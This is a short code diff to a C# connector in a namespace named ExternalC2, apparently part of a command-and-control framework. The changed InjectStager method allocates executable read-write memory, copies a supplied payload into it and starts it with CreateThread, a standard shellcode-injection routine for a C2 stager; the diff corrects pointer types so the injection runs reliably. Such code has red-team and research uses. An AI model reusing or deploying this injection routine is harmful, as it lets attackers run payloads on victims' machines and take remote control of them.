@@ -56,9 +56,9 @@ namespace ExternalC2.Connectors
         public uint InjectStager(byte[] payload)
         {
             uint threadId = 0;
-            var addr = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            IntPtr addr = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-            Marshal.Copy(payload, 0, (IntPtr) addr, payload.Length);
+            Marshal.Copy(payload, 0, addr, payload.Length);
             CreateThread(0, 0, addr, IntPtr.Zero, 0, ref threadId);
 
             return threadId;
@@ -68,14 +68,14 @@ namespace ExternalC2.Connectors
         private static extern IntPtr CreateThread(
             uint lpThreadAttributes,
             uint dwStackSize,
-            uint lpStartAddress,
+            IntPtr lpStartAddress,
             IntPtr param,
             uint dwCreationFlags,
             ref uint lpThreadId
         );
 
         [DllImport("kernel32")]
-        private static extern uint VirtualAlloc(
+        private static extern IntPtr VirtualAlloc(
             uint lpStartAddr,
             uint size,
             uint flAllocationType,
